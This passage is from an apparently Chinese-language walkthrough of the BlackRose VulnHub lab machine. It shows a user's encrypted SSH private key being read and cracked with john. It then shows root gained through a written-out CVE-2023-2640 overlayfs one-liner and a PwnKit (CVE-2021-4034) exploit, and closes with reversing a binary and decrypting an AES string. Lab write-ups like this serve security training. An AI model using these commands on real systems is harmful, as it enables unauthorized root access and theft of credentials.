delx delx  807 Nov  7  2019 .profile<br>1183756 drwx------ 2 delx delx 4.0K Nov  7  2019 .ssh<br></code></pre></td></tr></table></figure>
+
+<p>进入用户家目录中看到了 <code>.ssh</code> 文件，进入看看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> .ssh<br><span class="hljs-built_in">ls</span> -alih<br>total 20K<br>1183756 drwx------ 2 delx delx 4.0K Nov  7  2019 .<br>1179652 drwxr-xr-x 6 delx delx 4.0K Dec  5  2019 ..<br>1183764 -rw-r--r-- 1 delx delx  390 Nov  7  2019 authorized_keys<br>1183757 -rw------- 1 delx delx 1.8K Nov  7  2019 id_rsa<br>1183758 -rw-r--r-- 1 delx delx  390 Nov  7  2019 id_rsa.pub<br><span class="hljs-built_in">cat</span> id_rsa<br>-----BEGIN RSA PRIVATE KEY-----<br>Proc-Type: 4,ENCRYPTED<br>DEK-Info: AES-128-CBC,EC100EF5AB09B47D4E9774BD2A5263F7<br><br>66+ga/da/X5dODshv+050zni0avb5zvutVYj04tlApmncz+Yorcgu5EmWzFvKdZ9<br>PWsr69FOQ9OUDhYc7IQFHByETTh/lEGJbN/DiQhHuhaYTBysIs68TIELh5GJ+dL/<br>ZPTEywHi5kh7m5FrwPHoQjsxXdWycQWrknE4WJElDm7mkggZJTFga6rH9X2G51IE<br>AgGUPEIS976cYKW/+L82LvAiPsgRe/FDwxI325Pa6zdbnE3ITXNAKaSqdl0cHuUX<br>cZBq4x9D/YFT2ptvegsnqaTdl401GZQrxd67GwzOth8jn7wAzu9NsMQAbJzuW2mp<br>VbZEAIaWeOVaJyAQWAOKtYDVsFaBN5G2JpzLrQngN6VHc8AVBRBd5FlDsc+s/ROU<br>eaP2pt/jU9F3CqAO8ezkDm9H7olhJJ8f9HXWrsI/Rw/fZZbrxUmh3F8syLHpHd2r<br>/M/8ABMxYStpuRNo7dFNEvwY/lzdqlaRj5lDjvjKPQ14kJeGukKVY45oqP0FVeF4<br>VPP4B0mZtejvp9hpt5gX3sSdzfWWstYACSfilMlCQLDpsZylqYIPy19mLeEMZknu<br>G0CDxYdbFpxiTWE9tJhreODK282IDmGwwcxP/XMIKkP/qZD3HaCBYIYYWgnegqSd<br>rPRhWA67Fbl499+6Gt1uo/JVjcM8dcj+q4XaQg/cbXGDzaRFUAqbTkc4qiFHHoiG<br>4dOAGgQICJ6I4dF63R2CRi28ruD7X+2UMaaitkP/tqNyygPq5qpQOtTtoqBMyKD2<br>4oUSABGeNGHRusDUmmSUIgwxLjO9Oc0mHzzdsN/phoOO24I+NJepuaaW9R9SX3gL<br>/pDKiYqXc5XIoW9n1EvP/QeS6mbeDSLMExp72dp2sf53uZO77N+eBHgULQagkR7n<br>8cq7LHuR4N369t0hkff01J7G6oNnY/OIYANWSEzl9gB0XMp1LVGEPtSvxYAi2ifU<br>qmml6KE1IX+O3sZVzKPIm8YxMp2CbjjFloSHfWA+EYpmbq/4yUs92zRFfkmDr6v8<br>LWeJzYPMrAv9mtarqjqM12YjybBl4sinfLsuGsEjZifTz9YYGrcOea0pkEOap+ji<br>wB+sTtOjJzaQ6jGUJvnR7krGdYnHiGbgav3PqKzeOnYfNG1sqRyTY4lkYB5Y9+ta<br>3EwY5PzyjwYBrpDryvdL9ssV89CTAK4JURglrEAGRcbjs7Fg21pxXjNmYUbr2Aag<br>SlcwLYO3cDOpai4rXsOnGx/34KRgIGdWpgusQh1Z9HXD3hDbcsPbAISRfpc3pGVL<br>WMWuTqYJNQMW3TRvEqrHqyfPLuFRAUTWy+8yBlWYvjeQmihfJ9Xg2xtoEdQmQVa4<br>GDnH58J0zUmOowPRe/0TKyOMsfs1f20p96qo2eqR6bpHjkRCWMTx8CUTyS1CVo6X<br>gH8JeI1sbhffdLJY3rPPzLquuqRlLJFBWtfQe6tCGNpLLY3e7o8EUmYdIwEm6jrI<br>0NFosxoPtZJz2cw/m5jzPCH0wIu7yDLLvBwhkK4XpZa/gNIy+TGjCLonmbU9vd7f<br>/qyR/XhYI1i3lxBF4JGLL8FoEFCfasuZZVyjvwjlUbHliroTxKupWHvhYyPjKo7f<br>-----END RSA PRIVATE KEY-----<br></code></pre></td></tr></table></figure>
+
+<p>得到了 ssh 私钥，尝试使用此私钥 ssh 登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ <span class="hljs-built_in">chmod</span> 400 id_rsa     <br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ ssh -i id_rsa delx@192.168.1.21<br>The authenticity of host <span class="hljs-string">&#x27;192.168.1.21 (192.168.1.21)&#x27;</span> can\<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:wc/f/+tP1y7HbxIJA9NHM2yXxP+Hm+8B/vKQk5XAsT4.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.1.21<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">Enter passphrase for key &#x27;</span>id_rsa<span class="hljs-string">&#x27;:</span><br></code></pre></td></tr></table></figure>
+
+<p>需要 passphrase，那就 john 上场</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ ssh2john id_rsa &gt; sshhash<br><br>┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ sudo john sshhash --wordlist=/usr/share/wordlists/rockyou.txt                                         <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])<br>Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 <span class="hljs-keyword">for</span> all loaded hashes<br>Cost 2 (iteration count) is 1 <span class="hljs-keyword">for</span> all loaded hashes<br>Will run 4 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>doggiedog        (id_rsa)     <br>1g 0:00:00:00 DONE (2023-10-12 09:44) 11.11g/s 3454Kp/s 3454Kc/s 3454KC/s dolcegabanna..dodgers9<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed.<br></code></pre></td></tr></table></figure>
+
+<p>使用 <code>doggiedog</code> 作为私钥的口令来 ssh 登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ ssh -i id_rsa delx@192.168.1.21                              <br>Enter passphrase <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;id_rsa&#x27;</span>: <br>Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-69-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>  System information as of Thu Oct 12 13:44:22 UTC 2023<br><br>  System load:  0.0                Processes:             105<br>  Usage of /:   11.0% of 48.96GB   Users logged <span class="hljs-keyword">in</span>:       0<br>  Memory usage: 72%                IP address <span class="hljs-keyword">for</span> enp0s3: 192.168.1.21<br>  Swap usage:   0%<br><br><br>201 packages can be updated.<br>153 updates are security updates.<br><br><br>Last login: Thu Dec  5 21:57:42 2019 from 192.168.1.123<br></code></pre></td></tr></table></figure>
+
+<p>尝试口令是否是此用户的密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">delx@BlackRose:~$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> delx: <br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> delx: <br>sudo: 1 incorrect password attempt<br></code></pre></td></tr></table></figure>
+
+<p>并不是。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">delx@BlackRose:~$ gcc --version<br>gcc (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0<br>Copyright (C) 2017 Free Software Foundation, Inc.<br>This is free software; see the <span class="hljs-built_in">source</span> <span class="hljs-keyword">for</span> copying conditions.  There is NO<br>warranty; not even <span class="hljs-keyword">for</span> MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.<br></code></pre></td></tr></table></figure>
+
+<p>有 gcc 啊，那可以尝试内核提权。接下来我使用 linpeas 进行了信息收集，查看了网站根目录、shadow 文件权限、用户家目录、一些特别的文件与压缩包。</p>
+<p>唯一的收获是 <code>/usr/local/.../showPassword</code> 比较特殊，但是不知道怎么去提取有效信息，strings 命令看到了奇怪的字符，但是输入之后还是没成功。耐心-1,-1,-1</p>
+<h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><p>尝试内核提权，先尝试了一个比较新的 EXP：CVE-2023-2640，成功提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">delx@BlackRose:/tmp$ unshare -<span class="hljs-built_in">rm</span> sh -c <span class="hljs-string">&quot;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;&quot;</span> &amp;&amp; u/python3 -c <span class="hljs-string">&#x27;import os;os.setuid(0);os.system(&quot;id&quot;)&#x27;</span><br>uid=0(root) gid=1002(delx) <span class="hljs-built_in">groups</span>=1002(delx)<br>delx@BlackRose:/tmp$ unshare -<span class="hljs-built_in">rm</span> sh -c <span class="hljs-string">&quot;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;&quot;</span> &amp;&amp; u/python3 -c <span class="hljs-string">&#x27;import os;os.setuid(0);os.system(&quot;/bin/bash&quot;)&#x27;</span><br><span class="hljs-built_in">mkdir</span>: cannot create directory ‘l’: File exists<br><span class="hljs-built_in">mkdir</span>: cannot create directory ‘u’: File exists<br><span class="hljs-built_in">mkdir</span>: cannot create directory ‘w’: File exists<br><span class="hljs-built_in">mkdir</span>: cannot create directory ‘m’: File exists<br>root@BlackRose:/tmp<span class="hljs-comment"># cd /root</span><br>root@BlackRose:/root<span class="hljs-comment"># ls -liah</span><br>total 36K<br>2097153 drwx------  6 root root 4.0K Jul 11  2020 .<br>      2 drwxr-xr-x 24 root root 4.0K Nov 13  2019 ..<br>2097158 lrwxrwxrwx  1 root root    9 Dec  3  2019 .bash_history -&gt; /dev/null<br>2097154 -rw-r--r--  1 root root 3.1K Dec  3  2019 .bashrc<br>2097164 drwx------  2 root root 4.0K Dec  5  2019 .cache<br>2097162 drwx------  3 root root 4.0K Nov  7  2019 .gnupg<br>2097159 drwxr-xr-x  3 root root 4.0K Nov  7  2019 .<span class="hljs-built_in">local</span><br>2097155 -rw-r--r--  1 root root  148 Aug 17  2015 .profile<br>2097168 -rw-r--r--  1 root root  511 Jul 11  2020 root.txt<br>2097156 drwx------  2 root root 4.0K Sep  7  2019 .ssh<br>root@BlackRose:/root<span class="hljs-comment"># cat root.txt </span><br>     _                   _                           _                   <br>    | | _____      _____| |   __      ____ _ ___    | |__   ___ _ __ ___ <br> _  | |/ _ \ \ /\ / / _ \ |   \ \ /\ / / _` / __|   | <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__/ _ \<br>| |_| |  __/\ V  V /  __/ |    \ V  V / (_| \__ \   | | | |  __/ | |  __/<br> \___/ \___| \_/\_/ \___|_|     \_/\_/ \__,_|___/   |_| |_|\___|_|  \___|<br>                                                                The box made by Jewel                               <br><br>7dcbcf000f38c8d2c0024011899ec84e<br><br>I thank you so much <span class="hljs-keyword">for</span> playing - Jewel 😀<br></code></pre></td></tr></table></figure>
+
+<p>然后尝试了 linpeas 推荐的第一个 EXP——cve-2021-4034，成功提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">delx@BlackRose:/tmp/CVE-2021-4034-main$ <span class="hljs-built_in">ls</span><br>cve-2021-4034.c  cve-2021-4034.sh  dry-run  LICENSE  Makefile  pwnkit.c  README.md<br>delx@BlackRose:/tmp/CVE-2021-4034-main$ make<br>cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c<br>cc -Wall    cve-2021-4034.c   -o cve-2021-4034<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;module UTF-8// PWNKIT// pwnkit 1&quot;</span> &gt; gconv-modules<br><span class="hljs-built_in">mkdir</span> -p GCONV_PATH=.<br><span class="hljs-built_in">cp</span> -f /bin/true GCONV_PATH=./pwnkit.so:.<br>delx@BlackRose:/tmp/CVE-2021-4034-main$ <span class="hljs-built_in">ls</span><br> cve-2021-4034     cve-2021-4034.sh   gconv-modules   LICENSE    pwnkit.c    README.md<br> cve-2021-4034.c   dry-run           <span class="hljs-string">&#x27;GCONV_PATH=.&#x27;</span>   Makefile   pwnkit.so<br> delx@BlackRose:/tmp/CVE-2021-4034-main$ ./cve-2021-4034<br><span class="hljs-comment"># whoami</span><br>root<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),1002(delx)<br></code></pre></td></tr></table></figure>
+
+<h2 id="设计的攻击路径"><a href="#设计的攻击路径" class="headerlink" title="设计的攻击路径"></a>设计的攻击路径</h2><p>主要参考 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/9le2wTxnfkvUb6FMNMhDVA">BlackRose: 1-VulnHub (qq.com)</a></p>
+<p>之前已经发现了 <code>/usr/local/.../showPassword</code> 文件，但是不知道如何处理，这里我们需要简单的逆向手段，拖进 IDA 里发现了一连串可能是用于判断的字符。<code>gqSFGqAJ</code></p>
+<p><img src="/pic/611abcc4d23f236799c70524b45da926_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ ./showPassword       <br>root@username:~<span class="hljs-comment"># gqSFGqAJ</span><br>Good luck buddy :)<br><br>┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ ./showPassword<br>root@username:~<span class="hljs-comment"># 123</span><br>person <span class="hljs-built_in">who</span> wrote me,he says it<span class="hljs-string">&#x27;s wrong 😀</span><br></code></pre></td></tr></table></figure>
+
+<p><code>JqT/3t/ucYLw/dlb6c5PzmQM9lRYjuRIPgCmcHP+RTE=</code> 看起来是加密&#x2F;编码后的字符串</p>
+<blockquote>
+<p>后边所用到的 AES 解密是需要去猜测的，一般有 key 的话就是对称加密算法，常见的对称加密算法有 DES、3DES、Blowfish、IDEA、RC4、RC5、RC6 和 AES。<br>这个没什么捷径，只能尝试去一个一个猜解。<br>同时秘钥长度为8，转换成字节就是32位，通过这个信息缩小些范围。</p>
+</blockquote>
+<p>使用在线网站 <a target="_blank" rel="noopener" href="https://aesencryption.net/">AES encryption</a> 进行解密</p>
+<p><img src="/pic/4a6367546426370b0b6f6854a8abd16f_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>RkZiPVkvxykJVOmxBmitBPeJXqFuxM</code> </p>
+<p>我比较疑惑的一个点是 AES 中其实有额外的参数，比如：填充方式等，这个网站实际上没有显示出这些参数，那么如果我想真正自己去解析 AES，又该怎么做呢？</p>
+<p>来自红队笔记解答的摘要：</p>
+<blockquote>
+<p>第一个问题：怎么判断出是 AES 加密的结果？<br>在本例中其实能想到 gqSFGqAJ 是 key 也不容易，因为需要有补全的想象力，是卡自己一段时间，四处突围地想和尝试才可能想到的。更多的是对加密算法使用习惯和频率的熟悉才能在思维上让你想到<br>第二个问题：如何使用 AES 解密？<br>简化思考的方式，aesencryption.net 这个站点现在也是可用的，也是如你看的 wp 能够解出明文密码的，靶机作者应该当初创建靶机就用这个站点生成的，然后因为 aesencryption.net 也比较通用，做这台靶机的用户网上一搜、一试也就通了<br>aes 加密加密涉及到诸多参数，而它都默认甚至忽略了。至少涉及这些问题：</p>
+<ol>
+<li>AES 密文和明文一般需要填充，用什么机制？</li>
+<li>key 位数怎么确定，不足需要怎么填充？是有常用机制，但也不唯一。</li>
+<li>最重要的，aesencryption.net 没有 iv 的选项，是都用了不用 iv 的 ECB 模式吗？<br>逆向了 aesencryption.net，对应上面问题的答案是：</li>
+<li>用的 pkcs #7 。</li>
+<li>key 要用0补足32个字节，256位。</li>
+<li>用的 cbc，而且 iv 用的是12345678b0z2345n 这种很独特的、随机的值。</li>
+</ol>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64  <br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES  <br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad  <br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_aes</span>(<span class="hljs-params">string_from_passwordapp, key_text, iv_re_from_aesencryption</span>):  <br>    <span class="hljs-string">&quot;&quot;&quot;  </span><br><span class="hljs-string">    使用AES解密Base64编码的密文。  </span><br><span class="hljs-string">     </span><br><span class="hljs-string">    参数:  </span><br><span class="hljs-string">    - string_from_passwordapp (str): 从密码应用程序获得的Base64编码的密文。  </span><br><span class="hljs-string">    - key_text (str): 用于AES的密钥。  </span><br><span class="hljs-string">    - iv_re_from_aesencryption (str): 从AES加密应用程序获得的初始化向量。  </span><br><span class="hljs-string">     </span><br><span class="hljs-string">    返回:  </span><br><span class="hljs-string">    - str: 解密后的明文。  </span><br><span class="hljs-string">     </span><br><span class="hljs-string">    异常:  </span><br><span class="hljs-string">    - ValueError: 解密失败或Base64解码失败。  </span><br><span class="hljs-string">    &quot;&quot;&quot;</span>  <br>     <br>    <span class="hljs-comment"># 确保密钥长度为32字节，适用于AES-256  </span><br>    key = key_text.ljust(<span class="hljs-number">32</span>, <span class="hljs-string">&#x27;\0&#x27;</span>).encode()  <br>    iv = iv_re_from_aesencryption.encode()  <br>  <br>    <span class="hljs-keyword">try</span>:  <br>        <span class="hljs-comment"># 解码从密码应用程序获得的Base64密文为原始的二进制格式  </span><br>        encrypted_data = base64.b64decode(string_from_passwordapp)  <br>         <br>        <span class="hljs-comment"># 使用AES进行解密  </span><br>        cipher = AES.new(key, AES.MODE_CBC, iv)  <br>        decrypted_text = cipher.decrypt(encrypted_data)  <br>  <br>        <span class="hljs-comment"># 使用PKCS7解填充  </span><br>        <span class="hljs-keyword">return</span> unpad(decrypted_text, AES.block_size, style=<span class="hljs-string">&#x27;pkcs7&#x27;</span>).decode()  <br>     <br>    <span class="hljs-keyword">except</span> (ValueError, AttributeError):  <br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;解密失败或Base64解码失败。&quot;</span>)  <br>  <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:  <br>    <span class="hljs-comment"># 提供的数据  </span><br>    key_text = <span class="hljs-string">&quot;gqSFGqAJ&quot;</span>  <br>    iv_re_from_aesencryption = <span class="hljs-string">&quot;12345678b0z2345n&quot;</span>  <br>    string_from_passwordapp = <span class="hljs-string">&quot;JqT/3t/ucYLw/dlb6c5PzmQM9lRYjuRIPgCmcHP+RTE=&quot;</span>  <br>  <br>    <span class="hljs-keyword">try</span>:  <br>        plain_text = decrypt_aes(string_from_passwordapp, key_text, iv_re_from_aesencryption)  <br>        <span class="hljs-built_in">print</span>(plain_text)  <br>    <span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:  <br>        <span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure>
+
+<p>可能出现的问题和解答：</p>
+<p><img src="/pic/7699795bd41e0f3ef8c87c7f75e9ac0a_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>在上述知识的基础上，<code>gqSFGqAJ000000000000000000000000</code> 作为 utf8 格式的 key 输入，还是失败了。因此我先是尝试添加了一层 Hex，确认了 base64 解码结果没问题，同时指定 AES Decrypt 的输入为 hex，这样就可以确认是 AES Decrypt 层出了问题，而可控参数实际上就只有 Key 和 IV，又经过不断的尝试，我得到了以下成功的结果</p>
+<figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">[<span class="hljs-name">https://gchq.github.io/CyberChef/</span>#recipe=From_Base64(<span class="hljs-symbol">&#x27;A-Za-z0-9%2B/%3D</span>](<span class="hljs-name">https://gchq.github.io/CyberChef/</span>#recipe=From_Base64(<span class="hljs-symbol">&#x27;A-Za-z0-9%2B/%3D</span>)&#x27;,true,false)AES_Decrypt(<span class="hljs-name">%7B</span><span class="hljs-symbol">&#x27;option</span><span class="hljs-symbol">&#x27;:</span><span class="hljs-symbol">&#x27;Hex</span>&#x27;,<span class="hljs-symbol">&#x27;string</span><span class="hljs-symbol">&#x27;:</span><span class="hljs-symbol">&#x27;677153464771414a000000000000000000000000000000000000000000000000</span><span class="hljs-symbol">&#x27;%7D</span>,%7B<span class="hljs-symbol">&#x27;option</span><span class="hljs-symbol">&#x27;:</span><span class="hljs-symbol">&#x27;UTF8</span>&#x27;,<span class="hljs-symbol">&#x27;string</span><span class="hljs-symbol">&#x27;:</span><span class="hljs-symbol">&#x27;12345678b0z2345n</span><span class="hljs-symbol">&#x27;%7D</span>,<span class="hljs-symbol">&#x27;CBC</span>&#x27;,<span class="hljs-symbol">&#x27;Raw</span>&#x27;,<span class="hljs-symbol">&#x27;Raw</span>&#x27;,%7B<span class="hljs-symbol">&#x27;option</span><span class="hljs-symbol">&#x27;:</span><span class="hljs-symbol">&#x27;Hex</span>&#x27;,<span class="hljs-symbol">&#x27;string</span><span class="hljs-symbol">&#x27;:</span>&#x27;<span class="hljs-symbol">&#x27;%7D</span>,%7B<span class="hljs-symbol">&#x27;option</span><span class="hljs-symbol">&#x27;:</span><span class="hljs-symbol">&#x27;Hex</span>&#x27;,<span class="hljs-symbol">&#x27;string</span><span class="hljs-symbol">&#x27;:</span>&#x27;<span class="hljs-symbol">&#x27;%7D</span>)&amp;input=SnFULzN0L3VjWUx3L2RsYjZjNVB6bVFNOWxSWWp1UklQZ0NtY0hQK1JURT0<br></code></pre></td></tr></table></figure>
+
+<p>将 key 的值由 UTF8的 <code>gqSFGqAJ000000000000000000000000</code> 更改为 hex 的 <code>677153464771414a000000000000000000000000000000000000000000000000</code> 就能成功，又翻查了一些资料，我判断是当输入 utf8，数字 0 在 utf8 编码中的二进制表示与其 ASCII 编码相同，为 00110000，如果想真正表示二进制的00000000又会遇到新的问题，也就是空字节的问题，所以在 CyberChef 中对于 key 需要补足0的情况只能使用 hex 作为 key 的输入。密码工具箱的验证：</p>
+<p><img src="/pic/48cca41cc16207ba75769d4b248c5154_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里还有个我们忽略的地方，也就是这个字符串的用处。打开网页时有个背景图，我们，将背景图片下载到本地查看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ exiftool background-image.jpg <br>ExifTool Version Number         : 12.57<br>File Name                       : background-image.jpg<br>Directory                       : .<br>File Size                       : 181 kB<br>File Modification Date/Time     : 2019:12:05 06:57:08-05:00<br>File Access Date/Time           : 2023:10:12 09:01:47-04:00<br>File Inode Change Date/Time     : 2023:10:12 09:01:47-04:00<br>File Permissions                : -rw-r--r--<br>File Type                       : JPEG<br>File Type Extension             : jpg<br>MIME Type                       : image/jpeg<br>JFIF Version                    : 1.01<br>Resolution Unit                 : inches<br>X Resolution                    : 300<br>Y Resolution                    : 300<br>Image Width                     : 960<br>Image Height                    : 640<br>Encoding Process                : Baseline DCT, Huffman coding<br>Bits Per Sample                 : 8<br>Color Components                : 3<br>Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)<br>Image Size                      : 960x640<br>Megapixels                      : 0.614<br>                                                                                                                  